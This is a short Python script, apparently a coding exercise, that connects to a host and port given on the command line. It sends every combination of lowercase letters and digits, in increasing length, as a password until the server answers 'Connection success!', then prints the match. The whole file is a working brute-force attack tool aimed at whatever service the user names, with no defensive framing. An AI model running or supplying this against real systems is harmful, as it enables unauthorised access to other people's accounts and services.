import socket
from string import ascii_lowercase, digits
from sys import argv
from itertools import product

valid_symbols = [i for i in ascii_lowercase] + [str(i) for i in digits]
args = argv


def brute_force():
    global valid_symbols
    for counter in range(1000000):
        for pass_ in product(valid_symbols, repeat=counter + 1):
            last_pass = "".join(pass_)
            yield last_pass.encode(encoding="utf-8")


with socket.socket() as client_socket:
    hostname = args[1]
    port = args[2]
    address = (hostname, int(port))
    client_socket.connect(address)
    passwd = brute_force()
    while True:
        message = next(passwd)
        client_socket.send(message)
        response = client_socket.recv(1024)
        if response.decode(encoding="utf-8") == "Connection success!":
            print(message.decode())
            break